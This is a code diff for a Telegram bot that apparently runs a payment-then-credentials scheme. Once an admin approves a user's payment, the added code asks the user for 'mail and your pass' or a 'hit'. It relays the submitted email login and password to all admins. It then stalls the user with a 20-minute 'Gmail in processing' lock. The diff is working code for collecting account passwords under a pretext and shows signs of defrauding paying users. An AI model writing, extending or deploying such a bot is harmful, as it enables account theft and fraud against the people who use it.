@@ -144,11 +144,13 @@ def get_payment_admin_keyboard(target_id):
     markup.row(btn_ban, btn_notify, btn_ask)
     return markup
 
-# 5 Seconds Delayed Message Thread
-def send_delayed_processing(target_id):
+def send_delayed_pass_prompt(target_id):
     time.sleep(5)
     try:
-        bot.send_message(target_id, "𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
+        user_states[target_id] = "AWAITING_CREDENTIALS"
+        cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        cancel_kb.add(types.KeyboardButton("🚫 Cancel"))
+        bot.send_message(target_id, "𝗚𝗜𝗩𝗘 𝗛𝗜𝗧 𝗢𝗥 𝗠𝗔𝗜𝗟 𝗔𝗡𝗗 𝙔𝙊𝙐𝙍 𝗣𝗔𝗦𝗦", reply_markup=cancel_kb)
     except Exception:
         pass
 
@@ -244,33 +246,24 @@ def handle_callbacks(call):
         if call.data.startswith("adm_app_"):
             target_id = int(call.data.split("adm_app_")[1])
             try:
-                # 1. First Message to User
-                bot.send_message(target_id, "Your funds have safely reached me. Mail in processing")
-                # 2. Start 20 Min Timer
-                processing_timers[target_id] = time.time()
-                # 3. Send second msg after 5 seconds
-                threading.Thread(target=send_delayed_processing, args=(target_id,), daemon=True).start()
+                bot.send_message(target_id, "Your funds have safely reached me.")
+                # 5 seconds delay to ask for MAIL & PASS
+                threading.Thread(target=send_delayed_pass_prompt, args=(target_id,), daemon=True).start()
                 
                 bot.answer_callback_query(call.id, "Payment Approved ✅")
-                new_cap = (call.message.caption or call.message.text or "") + "\n\n🟢 **APPROVED BY ADMIN**"
-                try:
-                    bot.edit_message_caption(caption=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
-                except Exception:
-                    bot.edit_message_text(text=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
+                new_cap = (call.message.caption or "") + "\n\n🟢 **APPROVED BY ADMIN**"
+                bot.edit_message_caption(caption=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
             except Exception:
                 pass
 
         elif call.data.startswith("adm_rej_"):
             target_id = int(call.data.split("adm_rej_")[1])
+            user_states.pop(target_id, None)
             try:
-                # Reject Message to User
-                bot.send_message(target_id, "Your funds are not reached us your transaction id invalid")
+                bot.send_message(target_id, "Your funds are not reached us your transaction id invalid", reply_markup=get_bottom_menu_keyboard())
                 bot.answer_callback_query(call.id, "Payment Rejected ❌")
-                new_cap = (call.message.caption or call.message.text or "") + "\n\n🔴 **REJECTED BY ADMIN**"
-                try:
-                    bot.edit_message_caption(caption=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
-                except Exception:
-                    bot.edit_message_text(text=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
+                new_cap = (call.message.caption or "") + "\n\n🔴 **REJECTED BY ADMIN**"
+                bot.edit_message_caption(caption=new_cap, chat_id=call.message.chat.id, message_id=call.message.message_id)
             except Exception:
                 pass
 
@@ -333,7 +326,7 @@ def handle_all_messages(message):
     # 20 Minutes Lock Handler
     if user_id in processing_timers and user_id not in ADMINS:
         if time.time() - processing_timers[user_id] < 1200:
-            bot.send_message(user_id, "W8 a minute  𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
+            bot.send_message(user_id, "W8 a minute 𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
             return
         else:
             processing_timers.pop(user_id, None)
@@ -353,7 +346,7 @@ def handle_all_messages(message):
         bot.send_message(user_id, "❌ Action Cancelled.", reply_markup=get_bottom_menu_keyboard())
         return
 
-    # Mail Payment SS / Text Details Received from User
+    # Step 1: Mail Payment SS or Msg Received -> Only send to Admin (No reply to user)
     if state == "AWAITING_PAYMENT_SS":
         user_states.pop(user_id, None)
         user_info = get_user(user_id)
@@ -372,12 +365,23 @@ def handle_all_messages(message):
                 if message.content_type == 'photo':
                     bot.send_photo(admin, message.photo[-1].file_id, caption=admin_caption, reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
                 else:
-                    bot.send_message(admin, f"{admin_caption}\n\n📝 Details:\n{text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+                    bot.send_message(admin, f"{admin_caption}\n\n📝 Text: {text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+            except Exception:
+                pass
+        return
+
+    # Step 2: User Gives Mail & Pass -> Send to admin, reply to user + Start 20-min Lock
+    if state == "AWAITING_CREDENTIALS":
+        user_states.pop(user_id, None)
+        processing_timers[user_id] = time.time()  # Start 20-minute timer
+
+        for admin in ADMINS:
+            try:
+                bot.send_message(admin, f"🔐 **User Credentials Received:**\nUser ID: `{user_id}`\n\n{text}", reply_markup=get_admin_action_keyboard(user_id))
             except Exception:
                 pass
 
-        # User ko bina kisi text ke direct wapas bottom menu par laana
-        bot.send_message(user_id, "⏳ Request submitted. Please wait for verification.", reply_markup=get_bottom_menu_keyboard())
+        bot.send_message(user_id, "𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺", reply_markup=get_bottom_menu_keyboard())
         return
 
     # Consumer Helpline Support State
